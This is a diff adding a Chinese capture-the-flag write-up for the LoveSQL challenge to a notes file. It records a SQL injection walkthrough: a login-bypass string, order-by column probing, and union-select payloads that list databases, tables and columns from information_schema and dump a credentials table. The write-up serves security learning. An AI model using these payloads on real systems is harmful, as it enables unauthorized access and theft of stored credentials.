@@ -265,4 +265,52 @@ base64解码
 
 
 
-234
+
+
+## [极客大挑战 2019]LoveSQL1
+
+首先万能密码注入一下`1' or 1=1 #` 得到`Hello admin！ Your password is '97e21b076d0fea0e1877b41d25a5851a' ` 我以为是flag，结果不是。
+
+登陆成功，看了一下url，是以get方式进行传参。先在username处测试一下有没有注入点：
+`?username=1' order by 1%23&password=123`
+
+没有报错，只是说账号密码错误。直到`order by 4`的时候，报错了.
+
+`Unknown column '4' in 'order clause'`
+
+判断出有三个字段，接下来开始寻找注入点：
+`?username=1' union select 1,2,3%23&password=123` 
+
+```
+Hello 2！
+Your password is '3'
+```
+
+
+
+很明显，2和3都是注入点，而且没有过滤，接下来直接写命令了。
+`?username=1' union select 1,database(),3%23&password=ads`
+得到数据库名：`geek！`
+
+```
+?username=1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=123
+```
+
+
+
+得到表名`geekuser,l0ve1ysq1` 
+
+```
+?username=1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'%23&password=123
+```
+
+
+
+得到字段名`id,username,password`
+
+```
+?username=1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&password=123
+```
+
+得到flag
+
